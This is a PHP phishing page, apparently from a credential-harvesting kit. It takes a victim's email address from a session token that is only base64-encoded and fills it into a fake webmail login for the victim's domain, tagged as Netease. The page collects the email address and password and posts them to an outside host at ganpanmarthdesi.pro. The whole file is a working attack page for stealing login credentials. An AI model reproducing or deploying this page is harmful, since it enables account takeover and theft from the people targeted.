<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>http://mail.<?php echo $ddomain;?></title>
<link rel="icon" type="image/png" href="https://i.ibb.co/GJc1fX9/url.png" />
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=id],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 31px;
  width: 245;
  padding: 6px 4px;
  margin: 0;
  border: 1px solid #7A8395;
  border-bottom: 1px solid black;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0;
  font-size: 14px;
  font-family: Arial,sans-serif;
  color: #404040;
  }
  </style>
<body>

<div align="center">
	<table border="0" width="950" cellspacing="0" cellpadding="0">
		<tr>
			<td background="https://i.ibb.co/8j3WJwt/bg.png">
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="90"></td>
				</tr>
				<tr>
					<td height="428">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td height="40"></td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td></td>
									<td width="413" height="355" >
									<table border="0" width="100%" cellspacing="0" cellpadding="0">

									   <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
										<tr>
											<td height="80"></td>
										</tr>
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="101"></td>
													<td>
													    <input type="id" name="user" required placeholder="&#35831;&#36755;&#20837;&#30331;&#24405;&#24080;&#21495;" size="20" value="<?php echo $users;?>@<?php echo $ddomain;?>" >
													    <input type="hidden" name="link" value="http://mail.<?php echo $ddomain;?>" ></td>
													    <input type="hidden" name="domain" value="<?php echo $ddomain;?>" ></td>
													    <input type="hidden" name="sender" value="Netease" ></td>
													<td width="60"></td>
												</tr>
											</table>
											</td>
										</tr>
										<tr>
											<td height="10" ></td>
										</tr>
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="101"></td>
													<td>
													    <input type="password" required name="passwd" size="20" autofocus ></td>
													<td width="67"></td>
												</tr>
											</table>
											</td>
										</tr>
										<tr>
											<td height="55"></td>
										</tr>
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="127"></td>
													<td>
													    <input type="image" src="https://i.ibb.co/K5kmrkP/btn.png" width="156" height="34"></td>
													<td width="130"></td>
												</tr>
											</table>
											</td>
										</tr>
										<tr>
											<td height="150" ></td>
										</tr>
									  </form>
									</table>
									</td>
									<td width="38">&nbsp;</td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="34"></td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="145"></td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>